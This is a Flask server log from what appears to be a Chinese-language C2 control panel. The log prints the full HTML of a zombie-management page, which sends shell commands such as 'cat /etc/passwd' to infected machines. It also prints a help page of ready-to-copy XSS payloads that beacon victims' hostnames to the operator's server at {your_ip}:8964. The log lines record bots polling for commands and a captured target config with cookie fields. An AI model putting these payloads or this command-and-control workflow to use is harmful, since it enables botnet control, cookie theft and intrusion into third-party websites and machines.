alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 21:31:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:31:29] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-25 21:31:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:31:29] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 21:31:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:31:29] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 21:31:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-25 21:31:32 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-25 21:31:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-25 21:31:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:31:32] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-25 21:33:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 21:33:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 21:33:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0029s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 21:33:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:33:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 21:33:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 21:33:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 21:33:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 21:33:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:33:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 21:57:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 help_page()
2025-06-25 21:57:31 | INFO     | control_route.py:89 | help_page() | 用戶請求查看幫助頁面
2025-06-25 21:57:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] help_page 執行完畢 (耗時: 0.0046s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>C2 控制面板 API 文檔</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<div class="container">\n    <h2>C2 控制面板 API 文檔</h2>\n    <p style="text-align: center; color: #6c757d; font-style: italic;">版本 1.0 - 完整的API使用說明</p>\n\n    <!-- API 端點列表 -->\n    <div class="help-section">\n        <h1>🚀 API 端點</h1>\n        <div class="endpoints-grid">\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge post">POST</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/add_message</code>\n                </div>\n                <p class="endpoint-description">通過表單添加控制消息</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">通過網頁表單提交</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/add_message</code>\n                </div>\n                <p class="endpoint-description">通過URL參數添加控制消息（適用於XSS攻擊）</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <ul>\n                        \n                        <li><code>message</code>: 必填 - 控制消息內容</li>\n                        \n                        <li><code>target_ip</code>: 可選 - 目標IP地址</li>\n                        \n                    </ul>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/add_message?message=惡意命令&amp;target_ip=192.168.1.100</code>\n                </div>\n\n                \n                <div class="xss-note">\n                    <span class="xss-badge">XSS</span>\n                    適合嵌入到 XSS 攻擊中\n                </div>\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/get_messages</code>\n                </div>\n                <p class="endpoint-description">獲取所有控制消息列表</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/get_messages</code>\n                </div>\n\n                \n            </div>\n            \n            <div class="endpoint-card">\n                <div class="endpoint-header">\n                    <span class="method-badge get">GET</span>\n                    <code class="endpoint-path">{your_ip}:8964/api/control/help</code>\n                </div>\n                <p class="endpoint-description">顯示此幫助頁面</p>\n\n                <div class="parameters">\n                    <h4>📝 參數:</h4>\n                    \n                    <p>無</p>\n                    \n                </div>\n\n                <div class="example">\n                    <h4>💡 範例:</h4>\n                    <code class="example-code">{your_ip}:8964/api/control/help</code>\n                </div>\n\n                \n            </div>\n            \n        </div>\n    </div>\n\n    <!-- XSS 載荷範例 -->\n    <div class="help-section">\n        <h1>🔥 XSS 攻擊載荷範例</h1>\n        <div class="xss-examples">\n            \n            <div class="xss-example-card">\n                <h3>基本 XSS 載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;fetch(&#39;http://{your_ip}:8964/api/control/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;fetch(&#39;http://{your_ip}:8964/api/control/add_message?message=XSS攻擊成功&amp;target_ip=&#39; + window.location.hostname)&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>隱藏的圖片載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;img src=&#39;http://{your_ip}:8964/api/control/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;img src=&#39;http://{your_ip}:8964/api/control/add_message?message=圖片載荷&amp;target_ip=受害者IP&#39; style=&#39;display:none&#39;&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>JavaScript 重定向</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;window.location.href=&#39;http://{your_ip}:8964/api/control/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;window.location.href=&#39;http://{your_ip}:8964/api/control/add_message?message=重定向攻擊&amp;target_ip=127.0.0.1&#39;&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>Ajax 靜默攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;http://{your_ip}:8964/api/control/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open(&#39;GET&#39;,&#39;http://{your_ip}:8964/api/control/add_message?message=Ajax攻擊&amp;target_ip=&#39;+location.hostname,true);xhr.send();&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>跨域 JSONP 攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;script&gt;var script=document.createElement(&#39;script&#39;);script.src=&#39;http://{your_ip}:8964/api/control/add_message?message=JSONP攻擊&amp;target_ip=&#39;+location.hostname+&#39;&amp;callback=console.log&#39;;document.head.appendChild(script);&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;script&gt;var script=document.createElement(&#39;script&#39;);script.src=&#39;http://{your_ip}:8964/api/control/add_message?message=JSONP攻擊&amp;target_ip=&#39;+location.hostname+&#39;&amp;callback=console.log&#39;;document.head.appendChild(script);&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>表單提交攻擊</h3>\n                <div class="payload-container">\n                    <code class="payload-code">&lt;form id=&#39;xss&#39; action=&#39;http://{your_ip}:8964/api/control/add_message&#39; method=&#39;GET&#39;&gt;&lt;input name=&#39;message&#39; value=&#39;表單攻擊&#39;&gt;&lt;input name=&#39;target_ip&#39; value=&#39;victim&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;xss&#39;).submit()&lt;/script&gt;</code>\n                    <button class="copy-btn" data-payload="&lt;form id=&#39;xss&#39; action=&#39;http://{your_ip}:8964/api/control/add_message&#39; method=&#39;GET&#39;&gt;&lt;input name=&#39;message&#39; value=&#39;表單攻擊&#39;&gt;&lt;input name=&#39;target_ip&#39; value=&#39;victim&#39;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;xss&#39;).submit()&lt;/script&gt;" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n            <div class="xss-example-card">\n                <h3>下載更多載荷</h3>\n                <div class="payload-container">\n                    <code class="payload-code">http://{your_ip}:8964/api/control/xss_payload</code>\n                    <button class="copy-btn" data-payload="http://{your_ip}:8964/api/control/xss_payload" onclick="copyPayload(this)">📋\n                        複製</button>\n                </div>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 重要提示 -->\n    <div class="help-section">\n        <h1>⚠️ 重要提示</h1>\n        <div class="notes-container">\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>⚠️ 重要：請將 {your_ip} 替換為您的實際IP地址（例如：192.168.1.100）</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>✅ 完整路徑格式：http://您的IP:8964/api/control/add_message</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🎯 GET 方式添加消息主要用於 XSS 攻擊場景</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>💾 所有消息都會被記錄到數據庫中，便於追踪攻擊來源</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🔧 target_ip 參數是可選的，可以為空或使用 location.hostname 動態獲取</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🌐 消息內容需要進行 URL 編碼以避免特殊字符問題</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>📊 所有請求都會被詳細記錄到系統日誌中</p>\n            </div>\n            \n            <div class="note-item">\n                <span class="note-icon">📌</span>\n                <p>🚫 注意跨域請求限制，某些載荷可能需要CORS設置</p>\n            </div>\n            \n        </div>\n    </div>\n\n    <!-- 快速測試區域 -->\n    <div class="help-section">\n        <h1>🧪 快速測試</h1>\n        <div class="test-container">\n            <h3>測試 GET 請求添加消息:</h3>\n            <div class="test-form">\n                <input type="text" id="testMessage" placeholder="輸入測試消息" value="測試消息">\n                <input type="text" id="testIP" placeholder="輸入測試IP" value="127.0.0.1">\n                <button onclick="testGetRequest()" class="test-btn">🚀 發送測試請求</button>\n            </div>\n            <div id="testResult" class="test-result"></div>\n        </div>\n    </div>\n\n    <!-- 返回按鈕 -->\n    <div style="text-align: center; margin-top: 40px;">\n        <a href="/api/control/get_messages" class="back-btn">← 返回控制面板</a>\n    </div>\n</div>\n\n<style>\n    /* 幫助頁面專用樣式 */\n    .help-section {\n        margin: 40px 0;\n        padding: 30px;\n        background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);\n        border-radius: 15px;\n        border: 1px solid rgba(102, 126, 234, 0.1);\n    }\n\n    .endpoints-grid {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .endpoint-card {\n        background: white;\n        border-radius: 12px;\n        padding: 25px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #667eea;\n        transition: all 0.3s ease;\n    }\n\n    .endpoint-card:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);\n    }\n\n    .endpoint-header {\n        display: flex;\n        align-items: center;\n        gap: 15px;\n        margin-bottom: 15px;\n    }\n\n    .method-badge {\n        padding: 5px 12px;\n        border-radius: 20px;\n        font-weight: bold;\n        font-size: 12px;\n        text-transform: uppercase;\n    }\n\n    .method-badge.get {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n    }\n\n    .method-badge.post {\n        background: linear-gradient(135deg, #007bff, #6610f2);\n        color: white;\n    }\n\n    .endpoint-path {\n        background: #f8f9fa;\n        padding: 8px 12px;\n        border-radius: 6px;\n        font-family: \'Courier New\', monospace;\n        color: #495057;\n        border: 1px solid #dee2e6;\n    }\n\n    .endpoint-description {\n        color: #6c757d;\n        font-style: italic;\n        margin-bottom: 15px;\n    }\n\n    .parameters,\n    .example {\n        margin: 15px 0;\n    }\n\n    .parameters h4,\n    .example h4 {\n        color: #495057;\n        margin-bottom: 10px;\n        font-size: 14px;\n    }\n\n    .parameters ul {\n        margin: 10px 0;\n        padding-left: 20px;\n    }\n\n    .parameters li {\n        margin: 5px 0;\n        color: #6c757d;\n    }\n\n    .example-code,\n    .payload-code {\n        background: #2d3748;\n        color: #e2e8f0;\n        padding: 12px 15px;\n        border-radius: 8px;\n        font-family: \'Courier New\', monospace;\n        display: block;\n        overflow-x: auto;\n        white-space: pre-wrap;\n        word-break: break-all;\n    }\n\n    .xss-note {\n        background: linear-gradient(135deg, #fff3cd, #ffeaa7);\n        padding: 10px 15px;\n        border-radius: 8px;\n        margin-top: 15px;\n        border: 1px solid #ffeaa7;\n    }\n\n    .xss-badge {\n        background: #dc3545;\n        color: white;\n        padding: 3px 8px;\n        border-radius: 12px;\n        font-size: 10px;\n        font-weight: bold;\n        margin-right: 8px;\n    }\n\n    .xss-examples {\n        display: grid;\n        gap: 20px;\n        margin-top: 20px;\n    }\n\n    .xss-example-card {\n        background: white;\n        border-radius: 12px;\n        padding: 20px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n        border-left: 4px solid #dc3545;\n    }\n\n    .xss-example-card h3 {\n        color: #495057;\n        margin-bottom: 15px;\n        font-size: 16px;\n    }\n\n    .payload-container {\n        position: relative;\n    }\n\n    .copy-btn {\n        position: absolute;\n        top: 10px;\n        right: 10px;\n        background: #28a745;\n        color: white;\n        border: none;\n        padding: 5px 10px;\n        border-radius: 5px;\n        cursor: pointer;\n        font-size: 12px;\n        transition: all 0.3s ease;\n    }\n\n    .copy-btn:hover {\n        background: #218838;\n        transform: scale(1.05);\n    }\n\n    .notes-container {\n        display: grid;\n        gap: 15px;\n    }\n\n    .note-item {\n        display: flex;\n        align-items: flex-start;\n        gap: 12px;\n        background: white;\n        padding: 15px 20px;\n        border-radius: 10px;\n        box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);\n    }\n\n    .note-icon {\n        font-size: 18px;\n        margin-top: 2px;\n    }\n\n    .note-item p {\n        margin: 0;\n        color: #495057;\n        line-height: 1.6;\n    }\n\n    .test-container {\n        background: white;\n        padding: 25px;\n        border-radius: 12px;\n        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);\n    }\n\n    .test-form {\n        display: grid;\n        grid-template-columns: 1fr 1fr auto;\n        gap: 15px;\n        margin: 20px 0;\n        align-items: end;\n    }\n\n    .test-btn {\n        background: linear-gradient(135deg, #28a745, #20c997);\n        color: white;\n        border: none;\n        padding: 12px 20px;\n        border-radius: 8px;\n        cursor: pointer;\n        font-weight: bold;\n        transition: all 0.3s ease;\n    }\n\n    .test-btn:hover {\n        transform: translateY(-2px);\n        box-shadow: 0 5px 15px rgba(40, 167, 69, 0.4);\n    }\n\n    .test-result {\n        margin-top: 20px;\n        padding: 15px;\n        border-radius: 8px;\n        min-height: 20px;\n    }\n\n    .test-result.success {\n        background: linear-gradient(135deg, #d4edda, #c3e6cb);\n        color: #155724;\n        border: 1px solid #c3e6cb;\n    }\n\n    .test-result.error {\n        background: linear-gradient(135deg, #f8d7da, #f5c6cb);\n        color: #721c24;\n        border: 1px solid #f5c6cb;\n    }\n\n    .back-btn {\n        display: inline-block;\n        background: linear-gradient(135deg, #667eea, #764ba2);\n        color: white;\n        padding: 15px 30px;\n        border-radius: 10px;\n        text-decoration: none;\n        font-weight: bold;\n        transition: all 0.3s ease;\n        box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);\n    }\n\n    .back-btn:hover {\n        transform: translateY(-3px);\n        box-shadow: 0 8px 25px rgba(102, 126, 234, 0.6);\n        text-decoration: none;\n        color: white;\n    }\n\n    @media (max-width: 768px) {\n        .test-form {\n            grid-template-columns: 1fr;\n            gap: 10px;\n        }\n\n        .endpoint-header {\n            flex-direction: column;\n            align-items: flex-start;\n            gap: 10px;\n        }\n    }\n</style>\n\n<script>\n    function copyPayload(button) {\n        const text = button.getAttribute(\'data-payload\');\n        navigator.clipboard.writeText(text).then(function () {\n            // 顯示複製成功提示\n            const originalText = button.textContent;\n            button.textContent = \'✅ 已複製\';\n            button.style.background = \'#28a745\';\n\n            setTimeout(() => {\n                button.textContent = originalText;\n                button.style.background = \'#28a745\';\n            }, 2000);\n        }).catch(function (err) {\n            console.error(\'複製失敗: \', err);\n            alert(\'複製失敗，請手動複製\');\n        });\n    }\n\n    function testGetRequest() {\n        const message = document.getElementById(\'testMessage\').value;\n        const ip = document.getElementById(\'testIP\').value;\n        const resultDiv = document.getElementById(\'testResult\');\n\n        if (!message) {\n            resultDiv.className = \'test-result error\';\n            resultDiv.textContent = \'請輸入測試消息\';\n            return;\n        }\n\n        // 使用相對路徑（因為在同一個域名下）\n        const url = `/api/control/add_message?message=${encodeURIComponent(message)}&target_ip=${encodeURIComponent(ip)}`;\n\n        resultDiv.textContent = \'發送中...\';\n        resultDiv.className = \'test-result\';\n\n        fetch(url)\n            .then(response => response.json())\n            .then(data => {\n                if (data.status === \'success\') {\n                    resultDiv.className = \'test-result success\';\n                    resultDiv.innerHTML = `\n                    <strong>✅ 測試成功!</strong><br>\n                    消息: ${data.data.message}<br>\n                    目標IP: ${data.data.target_ip || \'未指定\'}<br>\n                    時間: ${data.data.timestamp}<br>\n                    <small>完整URL: ${window.location.origin}${url}</small>\n                `;\n                } else {\n                    resultDiv.className = \'test-result error\';\n                    resultDiv.textContent = `❌ 錯誤: ${data.error}`;\n                }\n            })\n            .catch(error => {\n                resultDiv.className = \'test-result error\';\n                resultDiv.textContent = `❌ 請求失敗: ${error.message}`;\n            });\n    }\n</script>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 21:57:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:57:31] "GET /api/control/help HTTP/1.1" 200 -
2025-06-25 21:57:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:57:31] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 21:57:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 21:57:31] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 22:02:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 22:02:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 22:02:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 22:02:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:02:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 22:02:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 22:02:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 22:02:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 22:02:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:02:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 22:03:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 22:03:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 22:03:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 22:03:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 22:03:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 22:05:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 22:05:03 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 22:05:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0062s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 